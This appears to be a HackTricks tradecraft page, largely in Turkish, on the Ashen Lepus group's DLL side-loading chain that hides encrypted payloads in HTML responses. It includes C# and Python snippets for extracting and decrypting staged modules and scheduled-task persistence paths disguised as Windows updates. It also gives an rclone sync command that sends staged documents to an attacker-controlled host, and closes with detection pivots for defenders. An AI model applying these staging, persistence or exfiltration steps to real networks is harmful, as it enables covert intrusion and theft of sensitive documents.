# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE), DLL sideloading, staged HTML payloads ve modular .NET backdoor’ları zincirleyen tekrar edilebilir bir deseni kullanarak Orta Doğu diplomatik ağlarında kalıcılık sağladı. Teknik operatör tarafından yeniden kullanılabilir çünkü şu temellere dayanıyor:

- **Archive-based social engineering**: zararsız görünen PDF’ler hedefleri bir dosya paylaşım sitesinden bir RAR arşivi indirmeye yönlendirir. Arşiv gerçekçi görünen bir document viewer EXE’si, güvenilir bir kütüphanenin adıyla `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` gibi isimlendirilmiş kötü amaçlı bir DLL ve bir decoy `Document.pdf` içerir.
- **DLL search order abuse**: hedef EXE’ye çift tıklar, Windows DLL import’unu mevcut dizinden çözer ve kötü amaçlı loader (AshenLoader) güvenilen süreç içinde çalıştırılırken decoy PDF şüphe çekmemesi için açılır.
- **Living-off-the-land staging**: sonraki her aşama (AshenStager → AshenOrchestrator → modüller) gerektiği kadar diske yazılmaz, bunun yerine zararsız görünen HTML cevapları içine gizlenmiş şifreli blob’lar olarak teslim edilir.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE, AshenLoader’ı side-load eder; loader host keşfi yapar, AES-CTR ile şifreler ve onu `token=`, `id=`, `q=` veya `auth=` gibi dönen parametrelerde POST ederek `/api/v2/account` gibi API-benzeri yollara gönderir.
2. **HTML extraction**: C2, istemci IP’si hedef bölgeye geolocate olduğunda ve `User-Agent` implant ile eşleştiğinde bir sonraki aşamayı açığa çıkarır; bu durum sandboxes’ları engeller. Kontroller geçildiğinde HTTP gövdesi içinde Base64/AES-CTR ile şifrelenmiş AshenStager payload’unu taşıyan `<headerp>...</headerp>` blob’u bulunur.
3. **Second sideload**: AshenStager, `wtsapi32.dll` import eden başka bir meşru ikili ile konuşlandırılır. İkiliye enjekte edilen kötü amaçlı kopya daha fazla HTML çeker ve bu sefer `<article>...</article>` parçalayarak AshenOrchestrator’u geri kazanır.
4. **AshenOrchestrator**: Base64 JSON config’i çözen modüler .NET kontrolcüsü. Config’teki `tg` ve `au` alanları birleştirilip hash’lenerek AES anahtarı oluşturulur ve `xrk` çözülür. Ortaya çıkan byte’lar daha sonra getirilen her modül blob’u için bir XOR anahtarı olarak kullanılır.
5. **Module delivery**: her modül, parser’ı `<headerp>` veya `<article>` gibi sabit kuralları arayan statik denetimleri atlatmak için işaretçiyi keyfi bir tage yönlendiren HTML yorumları ile tanımlanır. Modüller persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) ve file exploration (`FE`) içerir.

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Savunucular belirli bir öğeyi engelleseler veya kaldırsalar bile, operatör teslimata devam etmek için HTML yorumunda belirtilen etiketi değiştirmek yeterlidir.

### Hızlı Çıkarma Yardımcısı (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Paralellikleri

Son HTML smuggling araştırması (Talos), HTML eklerinde `<script>` blokları içinde Base64 dizeleri olarak gizlenen payloads'ı ve bunların çalışma zamanında JavaScript ile çözümlendiğini vurguluyor. Aynı hile C2 cevapları için yeniden kullanılabilir: `<script>` tag'i (veya diğer DOM element) içinde şifrelenmiş blob'ları stage edip AES/XOR'dan önce bellekte çözerek sayfanın sıradan bir HTML gibi görünmesini sağlamak.

## Crypto & C2 Güçlendirme

- **AES-CTR everywhere**: mevcut loader'lar 256-bit anahtarlar artı nonce'lar (ör., `{9a 20 51 98 ...}`) gömüyor ve isteğe bağlı olarak şifrelemeden önce/sonra `msasn1.dll` gibi string'ler kullanarak bir XOR katmanı ekliyor.
- **Infrastructure split + subdomain camouflage**: staging sunucuları araç bazında ayrılıyor, farklı ASN'lerde barındırılıyor ve bazen meşru görünen alt alan adlarıyla maskeleniyor; bu sayede bir stage'in yakılması geri kalanları açığa çıkarmıyor.
- **Recon smuggling**: keşfedilen veriler artık yüksek değerli uygulamaları tespit etmek için Program Files listelerini içeriyor ve host'tan ayrılmadan önce her zaman şifreleniyor.
- **URI churn**: sorgu parametreleri ve REST yolları kampanyalar arasında değişiyor (`/api/v1/account?token=` → `/api/v2/account?auth=`), kırılgan tespitleri geçersiz kılıyor.
- **Gated delivery**: sunucular coğrafi olarak sınırlandırılmış ve yalnızca gerçek implants'lara yanıt veriyor. Onaylanmamış istemcilere şüphe uyandırmayan HTML döndürülüyor.

## Persistence & Execution Loop

AshenStager, Windows bakım işleri gibi görünen zamanlanmış görevler bırakıyor ve `svchost.exe` üzerinden çalıştırılıyor, örnekler:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Bu görevler, önyüklemede veya aralıklarla sideloading zincirini yeniden başlatarak AshenOrchestrator'ın diske tekrar dokunmadan taze modüller talep etmesini sağlıyor.

## Using Benign Sync Clients for Exfiltration

Operatorler, diplomatik belgeleri `C:\Users\Public` içine (herkese okunabilir ve şüphe uyandırmayan) özel bir modül aracılığıyla stage ediyor, sonra o dizini saldırgan kontrolündeki depolama ile senkronize etmek için meşru [Rclone](https://rclone.org/) ikilisini indiriyor. Unit42, bu aktörün Rclone'u ekfiltrasyon için kullandığının ilk kez gözlemlendiğini not ediyor; bu, meşru senkronizasyon araçlarının normal trafik içine karışmak için kötüye kullanılması trendiyle uyumlu:

1. **Stage**: hedef dosyaları `C:\Users\Public\{campaign}\` içine kopyala/topla.
2. **Configure**: saldırgan kontrolündeki bir HTTPS uç noktasına işaret eden bir Rclone config gönder (ör., `api.technology-system[.]com`).
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` komutunu çalıştır, böylece trafik normal bulut yedeklemelerine benzer.

Rclone'un meşru yedekleme iş akışlarında yaygın kullanılması nedeniyle, savunucular anormal yürütmelere (yeni ikililer, tuhaf remote'lar veya `C:\Users\Public`'in ani senkronizasyonu) odaklanmalı.

## Detection Pivots

- Beklenmedik şekilde kullanıcı yazılabilir yollardan DLL yükleyen **signed processes** için alarm verin (Procmon filtreleri + `Get-ProcessMitigation -Module`), özellikle DLL isimleri `netutils`, `srvcli`, `dwampi` veya `wtsapi32` ile örtüşüyorsa.
- Şüpheli HTTPS yanıtlarını **alışılmadık etiketlerin içinde gömülü büyük Base64 blob'ları** veya `<!-- TAG: <xyz> -->` yorumlarıyla korunmuş içerik açısından inceleyin.
- HTML avcılığını, AES/XOR işleminden önce JavaScript ile çözümlenen `<script>` blokları içindeki Base64 dizelerine (HTML smuggling-style staging) genişletin.
- `svchost.exe`'yi servis olmayan argümanlarla çalıştıran veya dropper dizinlerine işaret eden **zamanlanmış görevler** için av yapın.
- IT yönetimli lokasyonların dışında ortaya çıkan **Rclone** ikililerini, yeni `rclone.conf` dosyalarını veya `C:\Users\Public` gibi staging dizinlerinden çekim yapan senkronizasyon işleri için izleyin.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)

{{#include ../../../banners/hacktricks-training.md}}
